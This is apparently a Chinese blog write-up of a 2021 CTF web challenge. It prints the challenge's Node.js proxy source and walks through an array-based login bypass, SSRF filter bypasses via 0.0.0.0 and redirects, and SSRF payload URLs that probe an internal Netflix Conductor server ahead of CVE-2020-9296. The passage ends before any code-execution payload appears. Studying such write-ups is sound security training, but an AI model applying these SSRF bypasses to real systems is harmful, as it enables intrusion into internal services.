class="line"></span><br><span class="line"><span class="keyword">const</span> port = process.env.PORT || <span class="number">3000</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">formatResopnse</span>(<span class="params">response</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">typeof</span>(response) !== <span class="keyword">typeof</span>(<span class="string">&#x27;&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">JSON</span>.stringify(response)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SSRF_WAF</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> host = <span class="keyword">new</span> UrlParse(url).hostname.replace(<span class="regexp">/\[|\]/g</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> isIp(host) &amp;&amp; IP.isPublic(host)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">FLAG_WAF</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> pathname = <span class="keyword">new</span> UrlParse(url).pathname</span><br><span class="line">    <span class="keyword">return</span> !pathname.startsWith(<span class="string">&#x27;/flag&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">OTHER_WAF</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> WAF_LISTS = [OTHER_WAF, SSRF_WAF, FLAG_WAF] </span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(req.session.admin === <span class="literal">undefined</span> || req.session.admin === <span class="literal">null</span>) &#123;</span><br><span class="line">        res.redirect(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.redirect(<span class="string">&#x27;/index&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/login&#x27;</span>, <span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123;username, password&#125; = req.query;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!username || !password || username === password || username.length === password.length || username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        res.render(<span class="string">&#x27;login&#x27;</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> hash = sha256(sha256(salt + username) + sha256(salt + password))</span><br><span class="line"></span><br><span class="line">        req.session.admin = hash === adminHash</span><br><span class="line"></span><br><span class="line">        res.redirect(<span class="string">&#x27;/index&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/index&#x27;</span>, <span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(req.session.admin === <span class="literal">undefined</span> || req.session.admin === <span class="literal">null</span>) &#123;</span><br><span class="line">        res.redirect(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.render(<span class="string">&#x27;index&#x27;</span>, &#123;<span class="attr">admin</span>: req.session.admin&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/proxy&#x27;</span>, <span class="keyword">async</span>(req, res, next) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.session.admin) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.redirect(<span class="string">&#x27;/index&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> url = <span class="built_in">decodeURI</span>(req.query.url);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">console</span>.log(url)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> status = WAF_LISTS.map(<span class="function">(<span class="params">waf</span>)=&gt;</span>waf(url)).reduce(<span class="function">(<span class="params">a,b</span>)=&gt;</span>a&amp;&amp;b)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!status) &#123;</span><br><span class="line">        res.render(<span class="string">&#x27;base&#x27;</span>, &#123;<span class="attr">title</span>: <span class="string">&#x27;WAF&#x27;</span>, <span class="attr">content</span>: <span class="string">&quot;Here is the waf...&quot;</span>&#125;)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> response = <span class="keyword">await</span> axios.get(<span class="string">`http://127.0.0.1:<span class="subst">$&#123;port&#125;</span>/search?url=<span class="subst">$&#123;url&#125;</span>`</span>)</span><br><span class="line">            res.render(<span class="string">&#x27;base&#x27;</span>, response.data)</span><br><span class="line">        &#125; <span class="keyword">catch</span>(error) &#123;</span><br><span class="line">            res.render(<span class="string">&#x27;base&#x27;</span>, error.message)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line">    </span><br><span class="line">router.post(<span class="string">&#x27;/proxy&#x27;</span>, <span class="keyword">async</span>(req, res, next) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.session.admin) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.redirect(<span class="string">&#x27;/index&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// test url</span></span><br><span class="line">    <span class="comment">// not implemented here</span></span><br><span class="line">    <span class="keyword">const</span> url = <span class="string">&quot;https://postman-echo.com/post&quot;</span></span><br><span class="line">    <span class="keyword">await</span> axios.post(<span class="string">`http://127.0.0.1:<span class="subst">$&#123;port&#125;</span>/search?url=<span class="subst">$&#123;url&#125;</span>`</span>)</span><br><span class="line">    res.render(<span class="string">&#x27;base&#x27;</span>, <span class="string">&quot;Something needs to be implemented&quot;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.all(<span class="string">&#x27;/search&#x27;</span>, <span class="keyword">async</span> (req, res, next) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="regexp">/127\.0\.0\.1/</span>.test(req.ip))&#123;</span><br><span class="line">        <span class="keyword">return</span> res.send(&#123;<span class="attr">title</span>: <span class="string">&#x27;Error&#x27;</span>, <span class="attr">content</span>: <span class="string">&#x27;You can only use proxy to aceess here!&#x27;</span>&#125;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> result = &#123;<span class="attr">title</span>: <span class="string">&#x27;Search Success&#x27;</span>, <span class="attr">content</span>: <span class="string">&#x27;&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> method = req.method.toLowerCase()</span><br><span class="line">    <span class="keyword">const</span> url = <span class="built_in">decodeURI</span>(req.query.url)</span><br><span class="line">    <span class="keyword">const</span> data = req.body</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(method == <span class="string">&#x27;get&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">const</span> response = <span class="keyword">await</span> axios.get(url)</span><br><span class="line">            result.content = formatResopnse(response.data)</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(method == <span class="string">&#x27;post&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">const</span> response = <span class="keyword">await</span> axios.post(url, data)</span><br><span class="line">            result.content = formatResopnse(response.data)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            result.title = <span class="string">&#x27;Error&#x27;</span></span><br><span class="line">            result.content = <span class="string">&#x27;Unsupported Method&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(error) &#123;</span><br><span class="line">        result.title = <span class="string">&#x27;Error&#x27;</span></span><br><span class="line">        result.content = error.message</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res.json(result)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/source&#x27;</span>, <span class="function">(<span class="params">req, res, next</span>)=&gt;</span>&#123;</span><br><span class="line">    res.sendFile( __dirname + <span class="string">&quot;/&quot;</span> + <span class="string">&quot;route.js&quot;</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/flag&#x27;</span>, <span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="regexp">/127\.0\.0\.1/</span>.test(req.ip))&#123;</span><br><span class="line">        <span class="keyword">return</span> res.send(&#123;<span class="attr">title</span>: <span class="string">&#x27;Error&#x27;</span>, <span class="attr">content</span>: <span class="string">&#x27;No Flag For You!&#x27;</span>&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res.json(&#123;<span class="attr">hint</span>: hint&#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = router</span><br></pre></td></tr></table></figure>



<p>查看 <code>login</code> 方法，也就是要满足以下条件</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!username || !password || username === password || username.length === password.length || username === <span class="string">&#x27;admin&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>和</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">req.session.admin = hash === adminHash</span><br></pre></td></tr></table></figure>



<p>其中我们传入的为</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> hash = sha256(sha256(salt + username) + sha256(salt + password))</span><br></pre></td></tr></table></figure>



<p>然后见代码 13 和 15行</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> salt = <span class="string">&#x27;nooooooooodejssssssssss8_issssss_beeeeest&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> adminHash = sha256(sha256(salt + <span class="string">&#x27;admin&#x27;</span>) + sha256(salt + <span class="string">&#x27;admin&#x27;</span>))</span><br></pre></td></tr></table></figure>



<p>也就是说，用户名和密码都要是 admin 但是，，他们长度和内容不一样  = =，好，非常好，还好 js 有的特性和 PHP 有点类似，<code>username</code> 用数组即可绕过</p>
<p><img src="/img/2021hfctf/image-20210403192049950.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403192049950.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403192049950"></p>
<p><img src="/img/2021hfctf/image-20210403192514722.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403192514722.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403192514722"></p>
<p>登录成功后，我们要想办法访问 <code>/flag</code> 接口，不过必须为内网 ip</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">router.get(<span class="string">&#x27;/flag&#x27;</span>, <span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="regexp">/127\.0\.0\.1/</span>.test(req.ip))&#123;</span><br><span class="line">        <span class="keyword">return</span> res.send(&#123;<span class="attr">title</span>: <span class="string">&#x27;Error&#x27;</span>, <span class="attr">content</span>: <span class="string">&#x27;No Flag For You!&#x27;</span>&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res.json(&#123;<span class="attr">hint</span>: hint&#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>



<p>代码里提供 <code>/proxy</code> 接口可以代理访问，然后这个接口是本机访问的，所以可以跳过这个限制</p>
<p>绕过点1</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SSRF_WAF</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> host = <span class="keyword">new</span> UrlParse(url).hostname.replace(<span class="regexp">/\[|\]/g</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> isIp(host) &amp;&amp; IP.isPublic(host)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>你传入的要是ip，，不能是域名，而且，ip必须是公网ip，其实这个好办，整个公网服务器，然后</p>
<p>写入代码重定向即可</p>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617438507933-f4a12b2e-a3b0-4509-a7c9-d12d8bcd107d.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617438507933-f4a12b2e-a3b0-4509-a7c9-d12d8bcd107d.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
<p>至于为啥在这里写 <code>/flag</code> 是因为内部代理请求不会触发这个waf 机制</p>
<p>绕过点2</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">FLAG_WAF</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> pathname = <span class="keyword">new</span> UrlParse(url).pathname</span><br><span class="line">    <span class="keyword">return</span> !pathname.startsWith(<span class="string">&#x27;/flag&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>构造一下</p>
<p><img src="/img/2021hfctf/image-20210403192837797.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403192837797.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403192837797"></p>
<p>即可得到提示，</p>
<p>大概意思是他们在内网部署了 netflix conductor 服务器，让我们 SSRF 一下，这里熟悉 docker 的 <a target="_blank" rel="noopener" href="https://guo.moe/">果果</a> 同学跟我说题目都是 docker 搭建的，会不会，，这个 netflix 服务也是 docker 来的呢？</p>
<p><img src="/img/2021hfctf/image-20210403193312651.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403193312651.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403193312651"></p>
<p><img src="/img/2021hfctf/image-20210403193452042.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403193452042.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403193452042"></p>
<p>膜拜.jpg ，至于为什么知道是 8080 端口，搜一下 netflix 官方部署文档，就 8080 和 5000 两个端口。</p>
<p>当然，这里还有小差曲，我一开始暴力破解，，内网ip 和 端口，直接把它给弄宕机了。。。</p>
<p>源码有点长，提取关键部分</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.swaggerUi = <span class="keyword">new</span> SwaggerUi(&#123;</span><br><span class="line">                  <span class="attr">url</span>: url + <span class="string">&quot;/api/swagger.json&quot;</span>,</span><br><span class="line">                  <span class="attr">dom_id</span>: <span class="string">&quot;swagger-ui-container&quot;</span>,</span><br><span class="line">                  <span class="attr">supportedSubmitMethods</span>: [<span class="string">&#x27;get&#x27;</span>, <span class="string">&#x27;post&#x27;</span>, <span class="string">&#x27;put&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;patch&#x27;</span>],</span><br><span class="line">                  <span class="attr">onComplete</span>: <span class="function"><span class="keyword">function</span>(<span class="params">swaggerApi, swaggerUi</span>)</span>&#123;</span><br><span class="line">                      <span class="built_in">window</span>.swaggerUi.api.setBasePath(<span class="string">&quot;/api&quot;</span>);</span><br><span class="line">                      <span class="keyword">if</span>(<span class="keyword">typeof</span> initOAuth == <span class="string">&quot;function&quot;</span>) &#123;</span><br><span class="line">                          initOAuth(&#123;</span><br><span class="line">                              <span class="attr">clientId</span>: <span class="string">&quot;your-client-id&quot;</span>,</span><br><span class="line">                              <span class="attr">clientSecret</span>: <span class="string">&quot;your-client-secret-if-required&quot;</span>,</span><br><span class="line">                              <span class="attr">realm</span>: <span class="string">&quot;your-realms&quot;</span>,</span><br><span class="line">                              <span class="attr">appName</span>: <span class="string">&quot;your-app-name&quot;</span>,</span><br><span class="line">                              <span class="attr">scopeSeparator</span>: <span class="string">&quot; &quot;</span>,</span><br><span class="line">                              <span class="attr">additionalQueryStringParams</span>: &#123;&#125;</span><br><span class="line">                          &#125;);</span><br><span class="line">                      &#125;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p>访问这个 json 文件</p>
<p><img src="/img/2021hfctf/image-20210403193726603.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403193726603.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403193726603"></p>
<p>然后到这就卡住了</p>
<p>网上搜了一下 CVE， <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7889">https://xz.aliyun.com/t/7889</a> 毕竟  SSRF 常见都是和 Redis 之类的的，一般都是公开漏洞，然后接口好像也可以正常访问</p>
<p><img src="/img/2021hfctf/image-20210403193837506.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403193837506.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403193837506"></p>
<p>正打算看看能不能 CRLF 啥的，看看能不能发送 POST 请求过去利用 CVE，但突然就访问不了了，，，</p>
<p><img src="/img/2021hfctf/image-20210403193944899.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403193944899.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403193944899"></p>
<p>不知道思路是不是跑偏了，然后被举办方给看到了 ，就直接卡了，然后就没啥时间了，也没来得及试其他的，坐等 wp，我很好奇.jpg</p>
<hr>
<p>4月22日更</p>
<p>好了，原来思路没有跑偏，我们继续（刚肝完论文</p>
<p>不过在 buu 的复现环境里直接给出了netflix 的内网ip，不用我们猜docker网段然后爆破，我们直接fuzz下图3个网段 8080端口即可</p>
<p><img src="/img/2021hfctf/image-20210422145443361.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210422145443361.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210422145443361"></p>
<p>最近刷了一些SSRF题，发现还可以用 0.0.0.0 的方式去绕过 IP 限制，访问 0.0.0.0 默认是解析到本机上的，然后恰好 nodejs 的 <code>IP.isPublic(host)</code> 函数会把他视为公网IP。</p>
<p>注意fuzz线程不能太高，不然服务容易崩，最终发现netflix在 10.0.219.14:8080</p>
<p><img src="/img/2021hfctf/image-20210422160555844.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210422160555844.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210422160555844"></p>
<p>现在网上搜了一下，发现有多个的漏洞，所以先确认一下 netflix 的版本，</p>
<p>先请求一下根路径发现源码有中暴露的api路径 </p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/proxy?url=http://0.0.0.0:3000/search?url=http://10.0.219.14:8080</span><br></pre></td></tr></table></figure>

<p>请求一下会返回json格式内容</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/proxy?url=http://0.0.0.0:3000/search?url=http://10.0.219.14:8080/api/swagger.json</span><br></pre></td></tr></table></figure>



<p>复制json 格式化一下发现 admin config 就在第一处，，</p>
<p><img src="/img/2021hfctf/image-20210422152257725.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210422152257725.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210422152257725"></p>
<p>请求一下</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/proxy?url=http://0.0.0.0:3000/search?url=http://10.0.219.14:8080/api/admin/config</span><br></pre></td></tr></table></figure>

<p><img src="/img/2021hfctf/image-20210422153043013.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210422153043013.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210422153043013"></p>
<p>发现 netflix 版本为 2.26.0，网上查了下，只发现 <a target="_blank" rel="noopener" href="https://snyk.io/vuln/maven:com.netflix.conductor%3Aconductor-core">2.25.3</a> 版本的漏洞</p>
<p>看了一下 <a target="_blank" rel="noopener" href="https://github.com/Netflix/conductor/pull/1543/commits/375f8d8b708a801647c327e0848b30d34f804edd">commit</a> 记录，发现这个版本已经修了的</p>
<p><img src="/img/2021hfctf/image-20210422153724132.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210422153724132.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210422153724132"></p>
<p>看了一下大佬的复现，发现思路是对了，CRLF POST 利用 netflix 的 CVE</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9423">https://xz.aliyun.com/t/9423</a></p>
<p><a target="_blank" rel="noopener" href="https://www.zhaoj.in/read-6905.html">https://www.zhaoj.in/read-6905.html</a></p>
<p>经过这次比赛，发现，有时候版本不对就先试试临近版本，看看能不能死马当活马医 （</p>
<p>首先要复现 CVE-2020-9296，先保证在本地能正常利用。</p>
<h3 id="CVE-2020-9296-复现"><a href="#CVE-2020-9296-复现" class="headerlink" title="CVE-2020-9296 复现"></a>CVE-2020-9296 复现</h3><h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>先搭建一下环境，复现一下</p>
<p>回到上面的 <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7889">https://xz.aliyun.com/t/7889</a> 链接</p>
<blockquote>
<p>Netflix Conductor uses Java Bean Validation (JSR 380) custom constraint validators. When building custom constraint violation error messages, different types of interpolation are supported, including Java EL expressions. If an attacker can inject arbitrary data in the error message template being passed to ConstraintValidatorContext.buildConstraintViolationWithTemplate() argument, they will be able to run arbitrary Java code.</p>
<p>本次漏洞成因在于自定义约束冲突时的错误信息支持了 Java EL 表达式。如果攻击者可以控制ConstraintValidatorContext.buildConstraintViolationWithTemplate() 函数的参数，那么可以通过注入 Java EL 表达式进行任意代码执行。</p>
</blockquote>
<p>源码代码下载：<a target="_blank" rel="noopener" href="https://codeload.github.com/Netflix/conductor/zip/refs/tags/v2.25.0">https://codeload.github.com/Netflix/conductor/zip/refs/tags/v2.25.0</a></p>
<p>全局搜一下 <code>buildConstraintViolationWithTemplate(</code> 发现多处有用到，并且参数利用 <code>String.format(0)</code> 生成的格式化字符串，格式化过程中存在用户可控的变量 <code>taskDef.getName()</code> 至于怎么发现的 <code>TaskTimeoutConstraint.java</code> 文件存在可利用点，可能排查起来就需要些时间和耐心了，这里跟着来先。</p>
<p><img src="/img/2021hfctf/image-20210422185124957.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210422185124957.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210422185124957"></p>
